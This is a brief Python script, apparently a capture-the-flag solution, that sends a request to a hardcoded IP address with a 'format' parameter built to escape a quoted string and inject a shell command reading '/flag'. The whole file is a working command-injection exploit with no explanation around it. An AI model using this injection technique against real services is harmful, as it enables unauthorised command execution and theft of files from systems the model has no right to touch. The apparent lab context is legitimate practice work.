#!/usr/bin/env python3


url = "http://142.93.38.140:30001/"


import requests

r = requests.get(url, params={"format": r"%H' && cat /flag  #"})
print(r.text)
